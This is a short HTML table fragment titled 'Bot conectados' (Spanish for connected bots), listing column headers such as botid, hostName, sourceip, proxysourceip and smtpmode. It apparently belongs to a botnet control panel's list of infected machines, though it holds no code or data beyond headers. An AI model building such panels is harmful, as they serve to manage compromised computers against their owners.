				<thead>
					<th colspan="6" style="background-color:#F0AD4E;" class="text-center">Bot conectados </th>  
				</thead>
				<tbody class="text-center">|
				  <tr>
				    <td> botid </td>
				    <td> status </td>
				    <td> hostName </td>
				    <td> osname </td>
				    <td> osversion </td>
				    <td> osarch </td>
				    <td> hostuptime </td>
				    <td> hostips </td>
				    <td> sourceip </td>
				    <td> proxysourceip </td>
				    <td> smtpmode </td>
				    <td> tcpconnections </td>
				    <td> created </td>
				    <td> lastupdated</td>
